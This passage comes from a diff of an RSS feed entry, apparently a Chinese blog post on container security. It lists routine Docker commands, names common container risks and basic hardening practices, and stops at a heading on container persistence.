+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 运行容器&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker run -d --name nginx nginx
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 查看运行中的容器&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker ps
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 进入容器&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker &lt;span style="color:#ff5c57"&gt;exec&lt;/span&gt; -it nginx /bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 停止容器&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker stop nginx
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 删除容器&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker rm nginx
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 3. 容器镜像操作&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 拉取镜像&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker pull nginx
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 查看镜像&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker images
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 构建镜像&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker build -t myapp .
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 推送镜像到仓库&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker push myregistry/myapp
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 4. 容器卷操作&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 创建卷&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker volume create myvolume
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 运行容器并挂载卷&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker run -d --name nginx -v myvolume:/app nginx
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 查看卷&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker volume ls
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 5. 容器安全风险&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 容器逃逸：从容器内部获取主机权限&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 镜像漏洞：容器镜像中存在的安全漏洞&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 配置错误：容器配置错误导致的安全问题&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 权限提升：通过容器获取更高的系统权限&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 横向移动：在容器环境中从一个容器移动到另一个容器&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 6. 基础安全实践&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 仅使用官方镜像：从可信的源拉取容器镜像&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 最小化镜像：使用最小化的基础镜像，减少攻击面&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 定期更新镜像：及时更新容器镜像，修复已知漏洞&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 限制容器权限：以最小必要权限运行容器&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 隔离网络：使用容器网络隔离，限制容器间的通信&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="容器环境持久化基础"&gt;容器环境持久化基础&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e7%8e%af%e5%a2%83%e6%8c%81%e4%b9%85%e5%8c%96%e5%9f%ba%e7%a1%80"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;了解容器环境持久化的基本技术：&lt;/p&gt;</description></item></channel></rss>
